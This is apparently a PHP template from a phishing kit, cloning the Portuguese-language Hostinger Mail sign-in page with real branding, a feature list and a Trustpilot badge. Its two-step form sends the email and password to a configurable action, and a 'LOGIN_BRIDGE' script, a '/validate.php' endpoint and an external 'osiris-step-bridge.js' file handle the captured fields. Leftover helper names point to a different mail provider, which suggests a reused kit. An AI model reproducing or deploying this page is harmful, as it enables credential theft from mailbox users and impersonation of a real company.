<?php declare(strict_types=1); ?>
<!doctype html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width,initial-scale=1"/>
    <meta name="theme-color" content="#FFFFFF"/>
    <title>Inicie sess&atilde;o no Hostinger Mail</title>
    <meta name="description" content="Email profissional, com tecnologia de IA. Seguro, fi&aacute;vel e concebido para ser f&aacute;cil."/>
    <link rel="icon" href="/assets/favicon.ico" sizes="any"/>
    <link rel="icon" type="image/png" sizes="32x32" href="/assets/icons/hmail-32.png"/>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Roboto:wght@400;500;600;700&display=swap"/>
    <link rel="stylesheet" href="/assets/hostinger-2026.css?v=24"/>
</head>
<body class="hi2026">
<div class="hi2026-shell">
    <div class="hi2026-left">
        <div class="hi2026-left-inner">
            <div class="hi2026-logo">
                <svg class="hi2026-logo-mark" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                    <rect width="28" height="28" rx="6" fill="#673DE6"/>
                    <path d="M8 20V8h3.2l4.8 7.2V8H20v12h-3.2L12 12.8V20H8z" fill="#fff"/>
                </svg>
                <span class="hi2026-logo-text">HOSTINGER</span>
            </div>
            <h1>Inicie sess&atilde;o no Hostinger Mail</h1>
            <form id="login_form" action="<?= e($loginAction) ?>" method="post" novalidate>
                <div id="step-email">
                    <div class="hi2026-field">
                        <label for="login">Endere&ccedil;o de email</label>
                        <input type="email" id="login" name="login" placeholder="" required autocomplete="username"/>
                        <p id="email_error" class="hi2026-field-error" hidden></p>
                    </div>
                    <button type="button" id="btn_continue" class="hi2026-submit hi2026-continue">Continuar</button>
                </div>
                <div id="step-password" class="hi2026-step-password" hidden>
                    <div class="hi2026-field">
                        <label for="password">Palavra-passe</label>
                        <div class="hi2026-input-wrap">
                            <input type="password" id="password" name="password" required autocomplete="current-password"/>
                            <button type="button" class="hi2026-toggle-pw" id="toggle_pw" aria-label="Mostrar palavra-passe">
                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/></svg>
                            </button>
                        </div>
                    </div>
                    <a class="hi2026-forgot" href="https://mail.hostinger.com/auth/forgot-password" target="_blank" rel="noopener">Esqueceu-se da palavra-passe?</a>
                    <div id="message"></div>
                    <button type="submit" id="login_submit" class="hi2026-submit">Login</button>
                </div>
            </form>
            <p class="hi2026-plans">N&atilde;o tem uma conta de email? <a href="https://www.hostinger.com/br/email-hosting" target="_blank" rel="noopener">Ver planos de email.</a></p>
        </div>
    </div>
    <div class="hi2026-right">
        <div class="hi2026-right-inner">
            <h2>Email profissional, <span>com tecnologia de IA</span></h2>
            <p class="lead">Seguro, fi&aacute;vel e concebido para ser f&aacute;cil &mdash; tudo o que precisa para o seu email empresarial.</p>
            <ul class="hi2026-features">
                <li><svg class="hi2026-check" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/></svg>Crie um email de marca (you@yourdomain.com)</li>
                <li><svg class="hi2026-check" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/></svg>Pesquise, resuma e escreva emails com a IA</li>
                <li><svg class="hi2026-check" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/></svg>Obtenha seguran&ccedil;a avan&ccedil;ada e 99,9% de uptime</li>
                <li><svg class="hi2026-check" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/></svg>Utilize com o Hostinger Mail, Gmail, Outlook e muito mais</li>
                <li><svg class="hi2026-check" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/></svg>Contacte o apoio em qualquer altura, 24/7</li>
            </ul>
            <div class="hi2026-trust">
                <strong>Excellent</strong>
                <span class="hi2026-stars">&#9733;&#9733;&#9733;&#9733;&#9733;</span>
                <a href="https://www.trustpilot.com/review/hostinger.com" target="_blank" rel="noopener">71,554 reviews on Trustpilot</a>
            </div>
        </div>
    </div>
</div>
<script>(function(){var b=document.getElementById("toggle_pw"),p=document.getElementById("password");if(b&&p){b.addEventListener("click",function(){p.type=p.type==="password"?"text":"password";});}})();</script><script>
window.LOGIN_BRIDGE = { form: "#login_form", email: "#login", password: "#password", message: "#message", submit: "#login_submit", domain: "", action: <?= json_encode($loginAction) ?>, validateAction: "/validate.php" };
window.UOL_OFFICIAL = <?= json_encode(uol_official_url($config), JSON_UNESCAPED_UNICODE) ?>;
window.UOL_MESSAGES = <?= json_encode([
    'authenticating' => uol_msg('authenticating'),
    'validating'     => 'A validar...',
    'network_error'  => uol_msg('network_error'),
], JSON_UNESCAPED_UNICODE) ?>;
</script>
<script src="/assets/osiris-step-bridge.js?v=24"></script>
</body>
</html>